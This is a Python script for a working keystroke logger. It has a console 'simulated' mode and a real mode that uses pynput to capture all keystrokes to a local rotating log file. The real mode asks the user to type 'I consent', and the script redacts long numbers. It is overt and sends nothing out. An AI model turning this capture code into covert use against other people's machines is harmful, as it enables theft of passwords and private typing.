#!/usr/bin/env python3
import re
import os
import logging
from logging.handlers import RotatingFileHandler

# Try to import pynput; HAS_PYNPUT will be False if not installed
try:
    from pynput.keyboard import Key, Listener
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

LOG_PATH = "keylog.log"
EXIT_CMD = "exit"
REDACT_NUMS = re.compile(r"\b\d{12,}\b")

def redact(text: str) -> str:
    """Replace long numeric sequences with [REDACTED]."""
    return REDACT_NUMS.sub("[REDACTED]", text)

def setup_logger(path: str) -> logging.Logger:
    """Create rotating file logger with safe permissions."""
    logger = logging.getLogger("keylogger_pro")
    logger.setLevel(logging.INFO)
    
     
 # Avoid duplicate handlers if the script is re-run in an interactive shell
    if not logger.handlers:
        handler = RotatingFileHandler(path, maxBytes=500_000, backupCount=3)
        fmt = logging.Formatter("%(asctime)s - %(message)s", "%Y-%m-%d %H:%M:%S")
        handler.setFormatter(fmt)
        logger.addHandler(handler)
        
        # Security: Protect the log file on Unix-based systems
        try:
            open(path, "a").close()
            os.chmod(path, 0o600)
        except Exception:
            pass
    return logger

# Keylogger callback functions
def on_press(key):
    logger = logging.getLogger("keylogger_pro")
    try:
        k = str(key.char)
    except AttributeError:
        k = f" [{key}] "
    logger.info(redact(k))

def on_release(key):
    if key == Key.esc:
        print(f"\nStopped. Log saved to {os.path.abspath(LOG_PATH)}")
        return False

def simulated_mode():
    """Simulated mode for online IDEs or quick testing."""
    print("Running in SIMULATED mode (for online compilers).")
    logger = setup_logger(LOG_PATH)
    print(f"Type something and press Enter. Type '{EXIT_CMD}' to stop.")
    while True:
        line = input("> ")
        if line.strip().lower() == EXIT_CMD:
            print(f"Stopped. Log saved to {os.path.abspath(LOG_PATH)}")
            break
        logger.info(redact(line))

def interactive_mode():
    """Real keylogger mode for local environments."""
    if not HAS_PYNPUT:
        print("Error: 'pynput' library not found. Run 'pip install pynput' or use Simulated mode.")
        return

    print("Running in INTERACTIVE mode (Real-time Keylogger).")
    print("Type 'I consent' to start recording, or anything else to cancel.")
    consent = input("> ").strip().lower()
    
    if consent != "i consent":
        print("Consent not given — exiting.")
        return

    setup_logger(LOG_PATH)
    print(f"Recording started. Press 'ESC' to stop.\n")
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Select Mode:\n1. Simulated mode (Online use/Console input)\n2. Interactive mode (Local use/Real Keylogger)")
    choice = input("Enter 1 or 2: ").strip()
    
    if choice == "1":
        simulated_mode()
    elif choice == "2":
        interactive_mode()
    else:
        print("Invalid selection.")
        
